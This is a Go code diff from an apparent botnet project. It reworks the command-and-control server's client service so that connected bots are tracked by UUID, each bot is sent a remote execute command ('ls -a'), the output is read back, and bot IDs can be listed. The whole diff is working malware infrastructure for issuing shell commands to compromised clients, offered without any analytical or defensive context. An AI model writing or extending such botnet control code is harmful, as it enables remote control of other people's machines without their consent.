@@ -3,21 +3,21 @@ package client
 import (
 	"bufio"
 	"fmt"
+	"io"
 	"log"
 	"net"
 	"strconv"
 
-	"github.com/phanletrunghieu/botnet/common/cmd"
-
 	"github.com/satori/go.uuid"
 
+	"github.com/phanletrunghieu/botnet/common/cmd"
 	"github.com/phanletrunghieu/botnet/server/domain"
 )
 
 // Service struct
 type Service struct {
 	listener net.Listener
-	Clients  []*domain.Client
+	Clients  map[uuid.UUID]*domain.Client
 	Error    chan error
 }
 
@@ -27,6 +27,7 @@ func NewClientService(port int) *Service {
 
 	service := &Service{
 		listener: ln,
+		Clients:  make(map[uuid.UUID]*domain.Client),
 		Error:    make(chan error),
 	}
 
@@ -56,7 +57,7 @@ func (s *Service) acceptConnection() {
 			Conn: conn,
 		}
 
-		s.Clients = append(s.Clients, client)
+		s.Clients[client.ID] = client
 
 		go s.handleConnection(client)
 
@@ -66,18 +67,26 @@ func (s *Service) acceptConnection() {
 
 func (s *Service) handleConnection(client *domain.Client) {
 	for {
-		if len(s.Clients) > 0 {
-			log.Println(s.Clients)
-			conn := s.Clients[0].Conn
-			fmt.Fprintf(conn, cmd.Execute+"ls -a\r")
-			// listen for replies
-			msg, err := bufio.NewReader(conn).ReadString('\r')
-			if err != nil {
-				fmt.Println(err)
-				return
+		conn := client.Conn
+		fmt.Fprintf(conn, cmd.Execute+"ls -a\r")
+		// listen for replies
+		msg, err := bufio.NewReader(conn).ReadString('\r')
+		if err != nil {
+			if err == io.EOF {
+				delete(s.Clients, client.ID)
 			}
-			fmt.Print(msg)
+			fmt.Println("xxxxxxxx", err)
 			return
 		}
+		fmt.Print(msg)
 	}
+}
+
+// ListClientID list all client id
+func (s *Service) ListClientID() []string {
+	listIDs := []string{}
+	for _, client := range s.Clients {
+		listIDs = append(listIDs, client.ID.String())
+	}
+	return listIDs
 }
